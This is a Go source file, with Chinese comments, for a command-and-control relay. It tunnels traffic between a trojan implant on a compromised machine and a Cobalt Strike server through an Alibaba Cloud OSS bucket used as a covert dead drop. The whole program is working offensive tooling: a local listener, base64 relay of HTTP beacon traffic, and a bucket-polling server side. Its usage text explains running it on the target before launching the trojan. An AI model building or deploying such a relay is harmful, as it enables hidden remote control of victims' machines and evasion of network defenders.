package main

import "C"
import (
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"github.com/aliyun/aliyun-oss-go-sdk/oss"
	"github.com/google/uuid"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

var aliyunc *oss.Client
var aliyunbucket *oss.Bucket
var timeout int
var server_address string
var bind_address string

func Get(name string) []byte {
	body, err := aliyunbucket.GetObject(name)
	if err != nil {
		fmt.Println("Error:", err)
	}
	// 数据读取完成后，获取的流必须关闭，否则会造成连接泄漏，导致请求无连接可用，程序无法正常工作。
	defer body.Close()

	data, err := ioutil.ReadAll(body)
	return data
}

func Send(name string, content string) {
	err := aliyunbucket.PutObject(name, strings.NewReader(content))
	if err != nil {
		log.Println("[-]", "上传失败")
	}
}

func Del(name string) {
	err := aliyunbucket.DeleteObject(name)
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(-1)
	}
}

func process(conn net.Conn) {
	uuid := uuid.New()
	key := uuid.String()
	defer conn.Close() // 关闭连接
	var buffer bytes.Buffer
	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	for {
		var buf [1]byte
		n, err := conn.Read(buf[:])
		if err != nil {
			log.Println("[-]", uuid, "read from connect failed, err：", err)
			break
		}
		buffer.Write(buf[:n])
		if strings.Contains(buffer.String(), "\r\n\r\n") {
			//fmt.Println("\n---------DEBUG CLIENT------\n", buffer.String(), "\n----------------------")
			if strings.Contains(buffer.String(), "Content-Length") {

				ContentLength := buffer.String()[strings.Index(buffer.String(), "Content-Length: ")+len("Content-Length: ") : strings.Index(buffer.String(), "Content-Length: ")+strings.Index(buffer.String()[strings.Index(buffer.String(), "Content-Length: "):], "\n")]
				log.Println("[+]", uuid, "数据包长度为：", strings.TrimSpace(ContentLength))
				if strings.TrimSpace(ContentLength) != "0" {
					intContentLength, err := strconv.Atoi(strings.TrimSpace(ContentLength))
					if err != nil {
						log.Println("[-]", uuid, "Content-Length转换失败")
					}

					for i := 1; i <= intContentLength; i++ {
						var b [1]byte
						n, err = conn.Read(b[:])
						if err != nil {
							log.Println("[-]", uuid, "read from connect failed, err", err)
							break
						}
						buffer.Write(b[:n])
					}

				}
			}
			if strings.Contains(buffer.String(), "Transfer-Encoding: chunked") {
				for {
					var b [1]byte
					n, err = conn.Read(b[:])
					if err != nil {
						log.Println("[-]", uuid, "read from connect failed, err", err)
						break
					}
					buffer.Write(b[:n])
					if strings.Contains(buffer.String(), "0\r\n\r\n") {
						break
					}
				}
			}
			log.Println("[+]", uuid, "从客户端接受HTTP头完毕")
			break
		}
	}
	b64 := base64.StdEncoding.EncodeToString(buffer.Bytes())
	Send(key+"/client.txt", b64)
	i := 1
	for {
		i++
		time.Sleep(1 * time.Second)
		if i >= timeout {
			log.Println("[x]", "超时，断开")
			Del(key + "/client.txt")
			return
		}
		buff := Get(key + "/server.txt")
		if buff != nil {
			log.Println("[x]", uuid, "收到服务器消息")
			//fmt.Println(buff)
			Del(key + "/server.txt")
			sDec, err := base64.StdEncoding.DecodeString(string(buff))
			//fmt.Println(sDec)
			if err != nil {
				log.Println("[x]", uuid, "Base64解码错误")
				return
			}
			conn.Write(sDec)
			break
		}
	}
	log.Println("[+]", "发送完成")
}

func HandleError(err error) {
	fmt.Println("Error:", err)
	os.Exit(-1)
}

func List() []string {
	var storedList []string
	// 列举所有文件。
	marker := ""
	for {
		lsRes, err := aliyunbucket.ListObjects(oss.Marker(marker))
		if err != nil {
			HandleError(err)
		}
		// 打印列举结果。默认情况下，一次返回100条记录。
		for _, object := range lsRes.Objects {
			storedList = append(storedList, object.Key)
		}
		if lsRes.IsTruncated {
			marker = lsRes.NextMarker
		} else {
			break
		}
	}

	return storedList
}

func process_server(name string) {

	uuid := name[:strings.Index(name, "/")]
	log.Println("[+]", "发现客户端："+uuid)
	buff := Get(name)
	sDec, err := base64.StdEncoding.DecodeString(string(buff))
	Del(name)
	conn, err := net.Dial("tcp", server_address)

	if err != nil {
		log.Println("[-]", uuid, "连接CS服务器失败")
		return
	}
	defer conn.Close()
	_, err = conn.Write(sDec)
	if err != nil {
		log.Println("[-]", uuid, "无法向CS服务器发送数据包")
		return
	}
	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	var buffer bytes.Buffer
	for {
		var buf [1]byte
		n, err := conn.Read(buf[:])
		if err != nil {
			log.Println("[-]", uuid, "read from connect failed, err", err)
			break
		}
		buffer.Write(buf[:n])

		if strings.Contains(buffer.String(), "\r\n\r\n") {
			//fmt.Println("\n---------DEBUG SERVER------", buffer.String(), "\n----------------------")
			if strings.Contains(buffer.String(), "Content-Length") {

				ContentLength := buffer.String()[strings.Index(buffer.String(), "Content-Length: ")+len("Content-Length: ") : strings.Index(buffer.String(), "Content-Length: ")+strings.Index(buffer.String()[strings.Index(buffer.String(), "Content-Length: "):], "\n")]
				log.Println("[+]", uuid, "数据包长度为：", strings.TrimSpace(ContentLength))
				if strings.TrimSpace(ContentLength) != "0" {
					intContentLength, err := strconv.Atoi(strings.TrimSpace(ContentLength))
					if err != nil {
						log.Println("[-]", uuid, "Content-Length转换失败")
					}

					for i := 1; i <= intContentLength; i++ {
						var b [1]byte
						n, err = conn.Read(b[:])
						if err != nil {
							log.Println("[-]", uuid, "read from connect failed, err", err)
							break
						}
						buffer.Write(b[:n])
					}

				}
			}
			if strings.Contains(buffer.String(), "Transfer-Encoding: chunked") {
				for {
					var b [1]byte
					n, err = conn.Read(b[:])
					if err != nil {
						log.Println("[-]", uuid, "read from connect failed, err", err)
						break
					}
					buffer.Write(b[:n])
					if strings.Contains(buffer.String(), "0\r\n\r\n") {
						break
					}
				}
			}
			log.Println("[+]", uuid, "从CS服务器接受完毕")
			break
		}
	}

	b64 := base64.StdEncoding.EncodeToString(buffer.Bytes())
	Send(uuid+"/server.txt", b64)
	log.Println("[+]", uuid, "服务器数据发送完毕")
	return

}
func startClient() {
	log.Println("[+]", "客户端启动成功")

	server, err := net.Listen("tcp", bind_address)
	if err != nil {
		log.Fatalln("[x]", "listen address ["+bind_address+"] faild.")
	}
	for {
		conn, err := server.Accept()
		if err != nil {
			log.Println("Accept() failed, err: ", err)
			continue
		}
		log.Println("[+]", "有客户进入：", conn.RemoteAddr())
		go process(conn)
	}
}
func startServer() {
	log.Println("[+]", "服务端启动成功")
	for {

		time.Sleep(1 * time.Second)
		for _, key := range List() {
			if strings.Contains(key, "client.txt") {
				go process_server(key)
			}
		}
	}
}

var qcloudEndpoint = flag.String("endpoint", "", "请输入你Bucket对应的Endpoint，以华东1（杭州）为例，填写为oss-cn-hangzhou.aliyuncs.com")
var qcloudSecretID = flag.String("id", "", "输入你的阿里云OSS ACCESS KEY")
var qcloudSecretKey = flag.String("key", "", "输入你的阿里云OSS ACCESS KEY SECRET")
var mode = flag.String("mode", "", "client/server 二选一")
var address = flag.String("address", "", "监听地址或者目标地址，格式：127.0.0.1:8080，即CS监听本地端口")
var qbucket = flag.String("bucket", "", "请输入你的阿里云bucket")

func main() {
	fmt.Println("[WARN] 需要确保OSS ACCESS KEY和OSS ACCESS KEY SECRET的权限最低")
	flag.Parse()
	if *mode == "" || *address == "" || *qcloudEndpoint == "" || *qbucket == "" {
		flag.PrintDefaults()
		fmt.Println("[WARN] 运行案例：")
		fmt.Println("[WARN] 在要上线机器上运行下面程序后再运行马：\r\naliyun-oss-c2-core.exe -mode client -address 127.0.0.1:8080 -endpoint oss-cn-beijing.aliyuncs.com -id LTAI5tNEupVMgZYjkJELsXXX -key qGTqABP1sQSxGhwSvt6J1W8QXXXXXX -bucket XXXX")

		fmt.Println("[WARN] 在服务器（C2机器上）运行下面程序后再运行马：\r\naliyun-oss-c2-core.exe -mode server -address 127.0.0.1:8080 -endpoint oss-cn-beijing.aliyuncs.com -id LTAI5tNEupVMgZYjkJELsXXX -key qGTqABP1sQSxGhwSvt6J1W8QXXXXXX -bucket XXXX")
		os.Exit(0)
	}
	aliyunc, err := oss.New(*qcloudEndpoint, *qcloudSecretID, *qcloudSecretKey)
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(-1)
	}
	aliyunbucket, err = aliyunc.Bucket(*qbucket)
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(-1)
	}
	timeout = 70
	if *mode == "client" {
		bind_address = *address
		startClient()
	} else if *mode == "server" {
		server_address = *address
		startServer()
	}

}
